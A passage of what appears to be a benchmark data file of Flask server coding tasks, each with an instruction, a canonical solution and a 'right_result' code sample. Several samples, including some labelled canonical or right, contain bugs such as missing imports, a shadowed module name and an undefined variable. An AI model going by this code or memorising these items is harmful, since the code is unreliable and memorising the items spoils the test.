    "Canonical_solution": "from flask import Flask, request\nfrom opentelemetry.instrumentation.wsgi import collect_request_attributes\nfrom opentelemetry.propagate import extract\nfrom opentelemetry.sdk.trace import TracerProvider\nfrom opentelemetry.sdk.trace.export import BatchSpanProcessor, ConsoleSpanExporter\nfrom opentelemetry.trace import SpanKind, get_tracer_provider, set_tracer_provider\n\napp = Flask(__name__)\nset_tracer_provider(TracerProvider())\ntracer = get_tracer_provider().get_tracer(__name__)\nget_tracer_provider().add_span_processor(BatchSpanProcessor(ConsoleSpanExporter()))\n\n@app.route(\"/server_request\")\ndef server_request():\n    with tracer.start_as_current_span(\n        \"server_request\",\n        context=extract(request.headers),\n        kind=SpanKind.SERVER,\n        attributes=collect_request_attributes(request.environ),\n    ):\n        print(request.args.get(\"param\"))\n        return \"served\"",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request\nimport opentelemetry.trace as trace\nfrom opentelemetry.sdk.trace import TracerProvider\nfrom opentelemetry.sdk.trace.export import SimpleSpanExporter, BatchSpanProcessor\nfrom opentelemetry.exporter.otlp.proto.grpc import OTLPSpanExporter\n\napp = Flask(__name__)\n\n# Initialize OpenTelemetry\nprovider = TracerProvider()\nexporter = OTLPSpanExporter(endpoint=\"http://localhost:4317\", insecure=True)\nprocessor = BatchSpanProcessor(exporter)\nprovider.add_span_processor(processor)\ntrace.set_tracer_provider(provider)\n\ntracer = provider.get_tracer(__name__)\n\n@app.route(\"/server_request\")\ndef server_request():\n    # Start a new OpenTelemetry span\n    with tracer.start_span(\"server_request\") as span:\n        # Extract request parameters\n        param = request.args.get(\"param\")\n        \n        # Set span attributes\n        span.set_attribute(\"request.param\", param)\n        \n        # Side effect: Print the value of the \"param\" query parameter if present\n        if param:\n            print(f\"Param: {param}\")\n        \n        # Return the response\n        return \"served\"\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", port=5000)"
  },
  {
    "Task_id": 138,
    "Instruction": "Task Description: Create a Flask-based HTTP server endpoint that processes credit card application data and returns a prediction result indicating the probability of approval and a binary decision.\n\nFunction Description: The function implements a prediction endpoint for a credit card approval system. It receives client data in JSON format, processes it through a machine learning model (using pre-loaded `dv` for feature transformation and `model` for prediction), and returns the prediction results including the approval probability and a binary decision.\n\nInput: \n- JSON payload containing client data for credit card application (received via HTTP POST request)\n\nOutput: \n- JSON response containing:\n  - 'get_card_probability': float - Probability of getting the credit card (between 0 and 1)\n  - 'get_card': boolean - Binary decision indicating whether the card is approved (True if probability \u2265 0.5)",
    "Canonical_solution": "from flask import Flask\nfrom flask import request\nfrom flask import jsonify\n\napp = Flask('credict-card')\n\n@app.route('/predict', methods=['POST'])\ndef predict():\n    client = request.get_json()\n\n    X = dv.transform([client])\n    y_pred = model.predict_proba(X)[0, 1]\n    get_card = y_pred >= 0.5\n\n    result = {\n        'get_card_probability': float(y_pred),\n        'get_card': bool(get_card)\n    }\n\n    return jsonify(result)\n\nif __name__ == \"__main__\":\n    app.run(debug=True, host='0.0.0.0', port=9696)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport json\n\napp = Flask(__name__)\n\n# Pre-loaded model and data validator\nmodel = None  # Assume this is loaded with the model\ndv = None     # Assume this is loaded with the data validator\n\n@app.route('/predict', methods=['POST'])\ndef predict():\n    global model, dv\n    data = request.get_json()\n    \n    # Process data using the data validator\n    X = dv.transform(data)\n    \n    # Make prediction using the model\n    probability = model.predict_proba(X)[0][1]\n    get_card = probability >= 0.5\n    \n    return jsonify({\n        'get_card_probability': float(probability),\n        'get_card': bool(get_card)\n    })\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)"
  },
  {
    "Task_id": 139,
    "Instruction": "Task Description: Create a Flask-based API service that handles document ingestion, question answering using a language model, and model downloading functionality.\n\nClass Description: FlaskAPI is a class that encapsulates a Flask web service for document processing and question answering. It provides endpoints for ingesting documents, querying an AI model, and downloading the required model files.\n\nAttributes:\n- app: Flask - The Flask application instance\n- embeddings_model_name: str - Name of the embeddings model to use\n- persist_directory: str - Directory to store persistent data\n- model_type: str - Type of the language model\n- model_path: str - Path to the model file\n- model_n_ctx: str - Context size for the model\n- llm: GPT4All - The language model instance\n\nMethods:\n- __init__() -> None - Initializes the Flask application and sets up CORS\n- _setup_routes() -> None - Defines all API routes and their handlers\n- _load_documents(source_dir: str) -> List[Document] - Loads documents from a directory\n- _load_single_document(file_path: str) -> Document - Loads a single document\n- run() -> None - Starts the Flask server\n- _load_model() -> None - Loads the language model if available\n\nRoute Handlers (internal methods):\n- ingest_data() -> Response - Handles document ingestion (GET /ingest)\n- get_answer() -> Response - Handles question answering (POST /get_answer)\n- download_and_save() -> Response - Handles model downloading (GET /download_model)\n\nThe class integrates with LangChain for document processing and GPT4All for local language model inference, providing a complete API for document-based question answering.",
    "Canonical_solution": "from flask import Flask, jsonify, request\nfrom flask_cors import CORS\nimport os\nimport glob\nfrom typing import List\nimport requests\nfrom langchain.chains import RetrievalQA\nfrom langchain.embeddings import HuggingFaceEmbeddings\nfrom langchain.callbacks.streaming_stdout import StreamingStdOutCallbackHandler\nfrom langchain.vectorstores import Chroma\nfrom langchain.llms import GPT4All\nfrom constants import CHROMA_SETTINGS\n\nclass FlaskAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        CORS(self.app)\n        self.embeddings_model_name = os.environ.get(\"EMBEDDINGS_MODEL_NAME\")\n        self.persist_directory = os.environ.get('PERSIST_DIRECTORY')\n        self.model_type = os.environ.get('MODEL_TYPE')\n        self.model_path = os.environ.get('MODEL_PATH')\n        self.model_n_ctx = os.environ.get('MODEL_N_CTX')\n        self.llm = None\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.route('/ingest', methods=['GET'])\n        def ingest_data():\n            source_directory = os.environ.get('SOURCE_DIRECTORY', 'source_documents')\n            print(f\"Loading documents from {source_directory}\")\n            chunk_size = 500\n            chunk_overlap = 50\n            documents = self._load_documents(source_directory)\n            text_splitter = RecursiveCharacterTextSplitter(chunk_size=chunk_size, chunk_overlap=chunk_overlap)\n            texts = text_splitter.split_documents(documents)\n            print(f\"Loaded {len(documents)} documents from {source_directory}\")\n            print(f\"Split into {len(texts)} chunks of text (max. {chunk_size} characters each)\")\n\n            embeddings = HuggingFaceEmbeddings(model_name=self.embeddings_model_name)\n            db = Chroma.from_documents(texts, embeddings, persist_directory=self.persist_directory, client_settings=CHROMA_SETTINGS)\n            db.persist()\n            db = None\n            return jsonify(response=\"Success\")\n\n        @self.app.route('/get_answer', methods=['POST'])\n        def get_answer():\n            query = request.json\n            embeddings = HuggingFaceEmbeddings(model_name=self.embeddings_model_name)\n            db = Chroma(persist_directory=self.persist_directory, embedding_function=embeddings, client_settings=CHROMA_SETTINGS)\n            retriever = db.as_retriever()\n            if self.llm is None:\n                return \"Model not downloaded\", 400    \n            qa = RetrievalQA.from_chain_type(llm=self.llm, chain_type=\"stuff\", retriever=retriever, return_source_documents=True)\n            if query is not None and query != \"\":\n                res = qa(query)\n                answer, docs = res['result'], res['source_documents']\n                source_data = [{\"name\": document.metadata[\"source\"]} for document in docs]\n                return jsonify(query=query, answer=answer, source=source_data)\n            return \"Empty Query\", 400\n\n        @self.app.route('/download_model', methods=['GET'])\n        def download_and_save():\n            url = 'https://gpt4all.io/models/ggml-gpt4all-j-v1.3-groovy.bin'\n            filename = 'ggml-gpt4all-j-v1.3-groovy.bin'\n            models_folder = 'models'\n\n            if not os.path.exists(models_folder):\n                os.makedirs(models_folder)\n            response = requests.get(url, stream=True)\n            total_size = int(response.headers.get('content-length', 0))\n            bytes_downloaded = 0\n            file_path = f'{models_folder}/{filename}'\n            if os.path.exists(file_path):\n                return jsonify(response=\"Download completed\")\n\n            with open(file_path, 'wb') as file:\n                for chunk in response.iter_content(chunk_size=4096):\n                    file.write(chunk)\n                    bytes_downloaded += len(chunk)\n                    progress = round((bytes_downloaded / total_size) * 100, 2)\n                    print(f'Download Progress: {progress}%')\n            callbacks = [StreamingStdOutCallbackHandler()]\n            self.llm = GPT4All(model=self.model_path, n_ctx=self.model_n_ctx, backend='gptj', callbacks=callbacks, verbose=False)\n            return jsonify(response=\"Download completed\")\n\n    def _load_documents(self, source_dir: str) -> List[Document]:\n        all_files = []\n        for ext in LOADER_MAPPING:\n            all_files.extend(glob.glob(os.path.join(source_dir, f\"**/*{ext}\"), recursive=True))\n        return [self._load_single_document(file_path) for file_path in all_files]\n\n    def _load_single_document(self, file_path: str) -> Document:\n        ext = \".\" + file_path.rsplit(\".\", 1)[-1]\n        if ext in LOADER_MAPPING:\n            loader_class, loader_args = LOADER_MAPPING[ext]\n            loader = loader_class(file_path, **loader_args)\n            return loader.load()[0]\n        raise ValueError(f\"Unsupported file extension '{ext}'\")\n\n    def run(self):\n        self._load_model()\n        self.app.run(host=\"0.0.0.0\", debug=False)\n\n    def _load_model(self):\n        filename = 'ggml-gpt4all-j-v1.3-groovy.bin'\n        models_folder = 'models'\n        file_path = f'{models_folder}/{filename}'\n        if os.path.exists(file_path):\n            callbacks = [StreamingStdOutCallbackHandler()]\n            self.llm = GPT4All(model=self.model_path, n_ctx=self.model_n_ctx, backend='gptj', callbacks=callbacks, verbose=False)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nfrom flask_cors import CORS\nfrom langchain.document_loaders import UnstructuredFileLoader\nfrom langchain.text_splitter import RecursiveCharacterTextSplitter\nfrom langchain.embeddings import HuggingFaceEmbeddings\nfrom langchain.vectorstores import FAISS\nimport os\nfrom gpt4all import GPT4All\n\nclass FlaskAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        CORS(self.app)\n        self.embeddings_model_name = \"sentence-transformers/all-MiniLM-L6-v2\"\n        self.persist_directory = \"documents\"\n        self.model_type = \"gpt4all\"\n        self.model_path = \"models/gpt4all.bin\"\n        self.model_n_ctx = \"2048\"\n        self.llm = GPT4All(model=self.model_path, n_ctx=int(self.model_n_ctx))\n        self._setup_routes()\n\n    def _setup_routes(self):\n        self.app.add_url_rule('/ingest', 'ingest_data', self.ingest_data, methods=['GET'])\n        self.app.add_url_rule('/get_answer', 'get_answer', self.get_answer, methods=['POST'])\n        self.app.add_url_rule('/download_model', 'download_and_save', self.download_and_save, methods=['GET'])\n\n    def _load_documents(self, source_dir):\n        documents = []\n        for filename in os.listdir(source_dir):\n            file_path = os.path.join(source_dir, filename)\n            loader = UnstructuredFileLoader(file_path)\n            docs = loader.load()\n            documents.extend(docs)\n        return documents\n\n    def _load_single_document(self, file_path):\n        loader = UnstructuredFileLoader(file_path)\n        return loader.load()\n\n    def run(self):\n        self._load_model()\n        self.app.run(host='0.0.0.0', port=5000)\n\n    def _load_model(self):\n        if not os.path.exists(self.model_path):\n            # Logic to download and save the model if not present\n            pass\n\n    def ingest_data(self):\n        if not os.path.exists(self.persist_directory):\n            os.makedirs(self.persist_directory)\n        documents = self._load_documents(self.persist_directory)\n        text_splitter = RecursiveCharacterTextSplitter(chunk_size=1000, chunk_overlap=200, length_function=len)\n        chunks = text_splitter.split_documents(documents)\n        # Save chunks to a vector store\n        embeddings = HuggingFaceEmbeddings(model_name=self.embeddings_model_name)\n        vectorstore = FAISS.from_documents(chunks, embeddings)\n        vectorstore.save_local(self.persist_directory)\n        return jsonify({\"status\": \"success\", \"message\": \"Documents ingested and stored.\"}), 200\n\n    def get_answer(self):\n        data = request.json\n        question = data.get('question')\n        if not question:\n            return jsonify({\"error\": \"No question provided\"}), 400\n        # Use the model to answer the question\n        answer = self.llm.generate_response(question)\n        return jsonify({\"answer\": answer}), 200\n\n    def download_and_save(self):\n        # Logic to handle model downloading and saving\n        return jsonify({\"status\": \"success\", \"message\": \"Model download and save initiated.\"}), 200\n\nif __name__ == '__main__':\n    app = FlaskAPI()\n    app.run(host='0.0.0.0', port=5000)"
  },
  {
    "Task_id": 140,
    "Instruction": "Task Description: Create a Flask-based HTTP server endpoint that converts text to speech (TTS) and returns the generated audio as a WAV file.\n\nFunction Description: The function `tts()` is a Flask route handler that processes GET requests to the '/api/tts' endpoint. It takes text input as a query parameter, synthesizes it into speech using a TTS synthesizer, and returns the audio as a WAV file in the response.\n\nInput: \n- text: [str] (passed as a query parameter 'text' in the GET request) - The text to be converted to speech.\n\nOutput:\n- [Flask Response] - A response containing the synthesized audio in WAV format with the appropriate MIME type ('audio/wav'). The audio data is streamed from memory using a BytesIO buffer.\n\nNote: The function assumes the existence of a pre-initialized `synthesizer` object capable of performing TTS (text-to-speech) conversion and saving the output as WAV format. The actual implementation of the synthesizer is not shown in this reference code.",
    "Canonical_solution": "from flask import Flask, render_template, request, send_file\nimport io\n\napp = Flask(__name__)\n\n@app.route('/api/tts', methods=['GET'])\ndef tts():\n    text = request.args.get('text')\n    print(\" > Model input: {}\".format(text))\n    wavs = synthesizer.tts(text)\n    out = io.BytesIO()\n    synthesizer.save_wav(wavs, out)\n    return send_file(out, mimetype='audio/wav')\n\ndef main():\n    app.run(debug=args.debug, host='0.0.0.0', port=args.port)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, Response\nimport io\n\napp = Flask(__name__)\n\n@app.route('/api/tts')\ndef tts():\n    text = request.args.get('text')\n    # Assuming synthesizer is a pre-initialized object capable of TTS\n    audio_data = synthesizer.synthesize(text)  # This line is illustrative; actual implementation depends on the synthesizer\n    wav_file = io.BytesIO(audio_data)\n    return Response(wav_file, mimetype='audio/wav')"
  },
  {
    "Task_id": 141,
    "Instruction": "Task Description: Create a Flask-based HTTP server that handles various file serving endpoints and a video processing endpoint, with CORS support.\n\nFunction Description: The code implements a Flask web server with multiple routes for serving different types of files (videos, posters, uploads) and processing video streams. It includes health check, file serving, and video propagation endpoints.\n\nInput:\n- For healthy(): None\n- For send_gallery_video(path: str): path parameter as string\n- For send_poster_image(path: str): path parameter as string\n- For send_uploaded_video(path: str): path parameter as string\n- For propagate_in_video(): JSON payload containing session_id and optional start_frame_index\n\nOutput:\n- healthy(): Returns \"OK\" with HTTP status 200\n- send_gallery_video(): Returns file from GALLERY_PATH or raises ValueError\n- send_poster_image(): Returns file from POSTERS_PATH or raises ValueError\n- send_uploaded_video(): Returns file from UPLOADS_PATH or raises ValueError\n- propagate_in_video(): Returns multipart video stream with tracking masks",
    "Canonical_solution": "from flask import Flask, make_response, Request, request, Response, send_from_directory\nfrom flask_cors import CORS\n\napp = Flask(__name__)\ncors = CORS(app, supports_credentials=True)\n\n@app.route(\"/healthy\")\ndef healthy() -> Response:\n    return make_response(\"OK\", 200)\n\n@app.route(f\"/{GALLERY_PREFIX}/<path:path>\", methods=[\"GET\"])\ndef send_gallery_video(path: str) -> Response:\n    try:\n        return send_from_directory(\n            GALLERY_PATH,\n            path,\n        )\n    except:\n        raise ValueError(\"resource not found\")\n\n@app.route(f\"/{POSTERS_PREFIX}/<path:path>\", methods=[\"GET\"])\ndef send_poster_image(path: str) -> Response:\n    try:\n        return send_from_directory(\n            POSTERS_PATH,\n            path,\n        )\n    except:\n        raise ValueError(\"resource not found\")\n\n@app.route(f\"/{UPLOADS_PREFIX}/<path:path>\", methods=[\"GET\"])\ndef send_uploaded_video(path: str):\n    try:\n        return send_from_directory(\n            UPLOADS_PATH,\n            path,\n        )\n    except:\n        raise ValueError(\"resource not found\")\n\n@app.route(\"/propagate_in_video\", methods=[\"POST\"])\ndef propagate_in_video() -> Response:\n    data = request.json\n    args = {\n        \"session_id\": data[\"session_id\"],\n        \"start_frame_index\": data.get(\"start_frame_index\", 0),\n    }\n\n    boundary = \"frame\"\n    frame = gen_track_with_mask_stream(boundary, **args)\n    return Response(frame, mimetype=\"multipart/x-savi-stream; boundary=\" + boundary)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, send_from_directory, request, jsonify, Response\nfrom flask_cors import CORS\nimport os\nimport json\nimport cv2\nimport numpy as np\n\napp = Flask(__name__)\nCORS(app)\n\nGALLERY_PATH = 'gallery'\nPOSTERS_PATH = 'posters'\nUPLOADS_PATH = 'uploads'\n\n@app.route('/healthy')\ndef healthy():\n    return \"OK\", 200\n\n@app.route('/send_gallery_video/<path>')\ndef send_gallery_video(path):\n    file_path = os.path.join(GALLERY_PATH, path)\n    if not os.path.exists(file_path):\n        raise ValueError(f\"File not found: {file_path}\")\n    return send_from_directory(GALLERY_PATH, path)\n\n@app.route('/send_poster_image/<path>')\ndef send_poster_image(path):\n    file_path = os.path.join(POSTERS_PATH, path)\n    if not os.path.exists(file_path):\n        raise ValueError(f\"File not found: {file_path}\")\n    return send_from_directory(POSTERS_PATH, path)\n\n@app.route('/send_uploaded_video/<path>')\ndef send_uploaded_video(path):\n    file_path = os.path.join(UPLOADS_PATH, path)\n    if not os.path.exists(file_path):\n        raise ValueError(f\"File not found: {file_path}\")\n    return send_from_directory(UPLOADS_PATH, path)\n\n@app.route('/propagate_in_video', methods=['POST'])\ndef propagate_in_video():\n    data = request.get_json()\n    session_id = data.get('session_id')\n    start_frame_index = data.get('start_frame_index', 0)\n\n    # Simulate video processing\n    video_path = os.path.join(UPLOADS_PATH, f\"{session_id}.mp4\")\n    if not os.path.exists(video_path):\n        return jsonify({\"error\": \"Video not found\"}), 404\n\n    cap = cv2.VideoCapture(video_path)\n    if not cap.isOpened():\n        return jsonify({\"error\": \"Failed to open video\"}), 500\n\n    frame_count = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))\n    fps = cap.get(cv2.CAP_PROP_FPS)\n    width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))\n    height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))\n\n    out = cv2.VideoWriter(os.path.join(UPLOADS_PATH, f\"{session_id}_processed.mp4\"), cv2.VideoWriter_fourcc(*'mp4v'), fps, (width, height))\n\n    cap.set(cv2.CAP_PROP_POS_FRAMES, start_frame_index)\n    while cap.isOpened():\n        ret, frame = cap.read()\n        if not ret:\n            break\n        # Simulate adding tracking mask\n        mask = np.zeros((height, width), dtype=np.uint8)\n        cv2.rectangle(mask, (50, 50), (200, 200), 255, -1)\n        frame = cv2.addWeighted(frame, 0.7, mask, 0.3, 0)\n        out.write(frame)\n\n    cap.release()\n    out.release()\n\n    return Response(open(os.path.join(UPLOADS_PATH, f\"{session_id}_processed.mp4\"), 'rb').read(), mimetype='video/mp4')\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)"
  },
  {
    "Task_id": 142,
    "Instruction": "Task Description: Create a RESTful API gateway service using Flask that handles incoming requests, processes them through an MII client, and provides health check and termination endpoints.\n\nClass Description: RestfulGatewayThread is a threaded Flask server implementation that creates and manages a RESTful API gateway for interacting with an MII client. It handles request processing, health checks, and graceful shutdown.\n\nAttributes:\n\n_deployment_name: str - The name of the MII deployment to connect to\n_rest_host: str - The host address to bind the server to\n_rest_port: int - The port number to listen on\n_rest_procs: int - Number of processes to handle requests\n_stop_event: threading.Event - Event flag to track server status\nserver: werkzeug.serving.BaseWSGIServer - The Flask server instance\n\nMethods:\n\n__init__(deployment_name: str, rest_host: str, rest_port: int, rest_procs: int) -> None - Initializes the thread with server configuration parameters\n_create_server(deployment_name: str, rest_host: str, rest_port: int, rest_procs: int) -> werkzeug.serving.BaseWSGIServer - Creates and configures the Flask server with routes and resources\n_shutdown() -> None - Handles server shutdown after a configured timeout period\nrun() -> None - Starts the server and runs it indefinitely until shutdown\nget_stop_event() -> threading.Event - Returns the stop event for monitoring server status",
    "Canonical_solution": "from flask import Flask, request, jsonify\nfrom flask_restful import Resource, Api\nfrom werkzeug.serving import make_server\nimport threading\nimport time\nimport mii\nfrom mii.constants import RESTFUL_GATEWAY_SHUTDOWN_TIMEOUT, RESTFUL_API_PATH\n\nclass RestfulGatewayService(Resource):\n    def __init__(self, deployment_name):\n        super().__init__()\n        self.client = mii.client(deployment_name)\n\n    def post(self):\n        data = request.get_json()\n        result = self.client.generate(**data)\n        return jsonify([r.to_msg_dict() for r in result])\n\nclass RestfulGatewayThread(threading.Thread):\n    def __init__(self, deployment_name, rest_host, rest_port, rest_procs):\n        threading.Thread.__init__(self)\n        self._stop_event = threading.Event()\n        self.server = self._create_server(deployment_name, rest_host, rest_port, rest_procs)\n\n    def _create_server(self, deployment_name, rest_host, rest_port, rest_procs):\n        app = Flask(\"RestfulGateway\")\n\n        @app.route(\"/terminate\", methods=[\"GET\"])\n        def terminate():\n            threading.Thread(target=self._shutdown).start()\n            return \"Shutting down RESTful API gateway server\"\n\n        @app.route(\"/healthz\", methods=[\"GET\"])\n        def healthz():\n            return \"ok\"\n\n        api = Api(app)\n        path = \"/{}/{}\".format(RESTFUL_API_PATH, deployment_name)\n        api.add_resource(RestfulGatewayService, path, resource_class_args=(deployment_name,))\n\n        return make_server(rest_host, rest_port, app, threaded=False, processes=rest_procs)\n\n    def _shutdown(self):\n        time.sleep(RESTFUL_GATEWAY_SHUTDOWN_TIMEOUT)\n        self.server.shutdown()\n\n    def run(self):\n        self.server.serve_forever()\n        self._stop_event.set()\n\n    def get_stop_event(self):\n        return self._stop_event",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "import threading\nfrom flask import Flask, request, jsonify\nfrom werkzeug.serving import BaseWSGIServer\nimport time\n\nclass RestfulGatewayThread:\n    def __init__(self, deployment_name: str, rest_host: str, rest_port: int, rest_procs: int):\n        self._deployment_name = deployment_name\n        self._rest_host = rest_host\n        self._rest_port = rest_port\n        self._rest_procs = rest_procs\n        self._stop_event = threading.Event()\n        self.server = self._create_server(deployment_name, rest_host, rest_port, rest_procs)\n\n    def _create_server(self, deployment_name: str, rest_host: str, rest_port: int, rest_procs: int) -> BaseWSGIServer:\n        app = Flask(__name__)\n\n        @app.route('/process', methods=['POST'])\n        def process_request():\n            data = request.json\n            # Simulate processing through MII client\n            result = {\"status\": \"success\", \"data\": data}\n            return jsonify(result)\n\n        @app.route('/health', methods=['GET'])\n        def health_check():\n            return jsonify({\"status\": \"healthy\"})\n\n        @app.route('/terminate', methods=['POST'])\n        def terminate():\n            self._stop_event.set()\n            return jsonify({\"status\": \"terminated\"})\n\n        def run_server():\n            app.run(host=rest_host, port=rest_port, processes=rest_procs)\n\n        server = BaseWSGIServer((rest_host, rest_port), app)\n        return server\n\n    def _shutdown(self):\n        timeout = 5  # seconds\n        self._stop_event.set()\n        while not self._stop_event.is_set() and timeout > 0:\n            time.sleep(1)\n            timeout -= 1\n\n    def run(self):\n        self.server.start()\n        try:\n            while not self._stop_event.is_set():\n                self.server.handle_one_request()\n        finally:\n            self._shutdown()\n\n    def get_stop_event(self):\n        return self._stop_event"
  },
  {
    "Task_id": 144,
    "Instruction": "Task Description: Create a Flask-based HTTP server with multiple endpoints to handle different types of requests and responses.\n\nFunction Description: The code implements three Flask route handlers that demonstrate different aspects of HTTP request handling: delayed response, request method detection, and JSON response.\n\nInput:\n- For '/respond' endpoint: \n  - Query parameter 'time' (integer): Milliseconds to sleep before responding\n- For '/request_type' endpoint: \n  - None (automatically detects HTTP method)\n- For '/json' endpoint: \n  - None\n\nOutput:\n- For '/respond' endpoint: \n  - Response text: 'Response from Flask' \n  - Headers: Access-Control-Allow-Origin: *\n  - After specified delay\n- For '/request_type' endpoint: \n  - Response text: 'Request Type: [METHOD]' \n  - Headers: Access-Control-Allow-Origin: *\n- For '/json' endpoint: \n  - JSON response: {'resp': 'Hello JSON!'}",
    "Canonical_solution": "from flask import Flask, request, make_response\nfrom time import sleep\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef respond():\n    time_to_sleep = int(request.args.get('time')) / 1000\n    sleep(time_to_sleep)\n    resp = make_response('Response from Flask')\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\n@app.route('/request_type')\ndef request_type():\n    resp = make_response('Request Type: ' + request.method)\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\n@app.route('/json')\ndef json():\n    return {resp:'Hello JSON!'}",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef respond():\n    time = int(request.args.get('time', 0))\n    import time\n    time.sleep(time / 1000)\n    return 'Response from Flask', 200, {'Access-Control-Allow-Origin': '*'}\n\n@app.route('/request_type')\ndef request_type():\n    method = request.method\n    return f'Request Type: {method}', 200, {'Access-Control-Allow-Origin': '*'}\n\n@app.route('/json')\ndef json():\n    return jsonify({'resp': 'Hello JSON!'}), 200, {'Access-Control-Allow-Origin': '*'}\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 145,
    "Instruction": "Task Description: Create a Flask-based HTTP server that handles POST requests for game predictions, processing board state data and returning optimal actions.\n\nFunction Description: The `predict` function is a Flask route handler that processes incoming game board states, applies either an AlphaZero-inspired MCTS algorithm or a greedy random player to determine the best move, and returns the action as a response.\n\nInput:\n- HTTP POST request with form data containing:\n  - 'board': [string] - Comma-separated string representing the game board state\n\nOutput:\n- HTTP Response containing:\n  - Body: [string] - The predicted action index\n  - Headers: Includes CORS permission ('Access-Control-Allow-Origin': '*')",
    "Canonical_solution": "import os\nimport sys\nimport numpy as np\nfrom flask import Flask, request, Response\n\nsys.path.append(\"..\")\nfrom utils import dotdict\n\napp = Flask(__name__)\n\n@app.route('/predict', methods=['POST'])\ndef predict():\n    board = np.fromstring(request.form['board'], sep=',').reshape(g.getBoardSize())\n\n    use_alpha_zero = True\n    if use_alpha_zero:\n        action = np.argmax(mcts.getActionProb(board, temp=0))\n    else:\n        action = GreedyRandomPlayer(g).play(board)\n\n    resp = Response(str(action))\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\nif __name__ == '__main__':\n    app.run(debug=False, host='0.0.0.0', port=8888)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify, make_response\n\napp = Flask(__name__)\n\ndef predict(board_state):\n    # Example logic: return a random action index between 0 and 8\n    import random\n    return str(random.randint(0, 8))\n\n@app.route('/predict', methods=['POST'])\ndef handle_predict():\n    data = request.form\n    board = data.get('board', '')\n    \n    # Process the board state and determine the optimal action\n    action = predict(board)\n    \n    # Set CORS headers\n    response = make_response(action)\n    response.headers['Access-Control-Allow-Origin'] = '*'\n    \n    return response\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)"
  },
  {
    "Task_id": 146,
    "Instruction": "Task Description: Create a Flask web application that handles form submissions, stores the data in both text and CSV formats, and redirects to a thank you page upon successful submission.\n\nFunction Description: The function handles form submissions via POST and GET requests. For POST requests, it extracts form data, writes it to both a text file and CSV file, then redirects to a thank you page. For GET requests or errors, it returns an error message.\n\nInput: \n- HTTP request object (via Flask's request) containing form data with keys: \"email\", \"subject\", and \"message\"\n\nOutput:\n- For successful POST requests: HTTP redirect to './thank_you.html'\n- For GET requests or errors: String error message 'Something went wrong. Try again!'",
    "Canonical_solution": "from flask import Flask, render_template, request, redirect\nimport csv\napp = Flask(__name__)\n\n@app.route('/submit_form', methods=['POST', 'GET'])\ndef submit_form():\n\tif request.method == \"POST\":\n\t\tdata = request.form.to_dict()\n\t\twrite_to_csv(data)\n\t\twrite_to_txt(data)\n\t\treturn redirect('./thank_you.html')\n\telse:\n\t\treturn 'Something went wrong. Try again!'\n\ndef write_to_txt(data):\n\temail = data[\"email\"]\n\tsubject = data[\"subject\"]\n\tmessage = data[\"message\"]\n\twith open(\"./database.txt\", mode = 'a') as database:\n\t\ttext = database.write(f\"\\n{email},{subject},{message}\")\n\ndef write_to_csv(data):\n\temail = data[\"email\"]\n\tsubject = data[\"subject\"]\n\tmessage = data[\"message\"]\n\twith open(\"./database.csv\", mode = 'a', newline='') as database2:\n\t\tcsv_writer = csv.writer(database2, delimiter=',', quotechar='\"', quoting=csv.QUOTE_MINIMAL)\n\t\tcsv_writer.writerow([email, subject, message])",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, redirect, render_template_string\n\napp = Flask(__name__)\n\ndef write_to_file(data, filename):\n    with open(filename, 'a') as f:\n        f.write(f\"{data}\\n\")\n\ndef write_to_csv(data, filename):\n    with open(filename, 'a', newline='') as f:\n        writer = csv.writer(f)\n        writer.writerow(data)\n\n@app.route('/', methods=['GET', 'POST'])\ndef form_submission():\n    if request.method == 'POST':\n        email = request.form.get('email')\n        subject = request.form.get('subject')\n        message = request.form.get('message')\n        \n        if not all([email, subject, message]):\n            return \"Something went wrong. Try again!\"\n        \n        text_data = f\"Email: {email}, Subject: {subject}, Message: {message}\"\n        write_to_file(text_data, 'form_data.txt')\n        write_to_csv([email, subject, message], 'form_data.csv')\n        \n        return redirect('./thank_you.html')\n    \n    return \"Something went wrong. Try again!\"\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 147,
    "Instruction": "Task Description: Create a Flask-based HTTP server class that handles streaming responses from a model pipeline, manages concurrent requests, and provides available method information.\n\nClass Description: ModelServer is a Flask application wrapper that provides HTTP endpoints for interacting with a model pipeline. It handles streaming responses, manages concurrent access to the model, and provides information about available methods.\n\nAttributes:\n- app: Flask - The Flask application instance\n- model: Any - The model pipeline object that processes requests\n- cors: CORS - Cross-Origin Resource Sharing configuration for the Flask app\n\nMethods:\n- __init__(model) -> None - Initializes the Flask app and sets up routes\n  - model: Any - The model pipeline object to be used for processing\n- run(host, port, debug) -> None - Starts the Flask server\n  - host: str (default=\"0.0.0.0\") - The host address to bind to\n  - port: int (default=5000) - The port number to listen on\n  - debug: bool (default=True) - Whether to run in debug mode\n- stream() -> Response - Handles streaming requests to the model\n  - Returns: Flask Response - A streaming response with model outputs\n- methods() -> 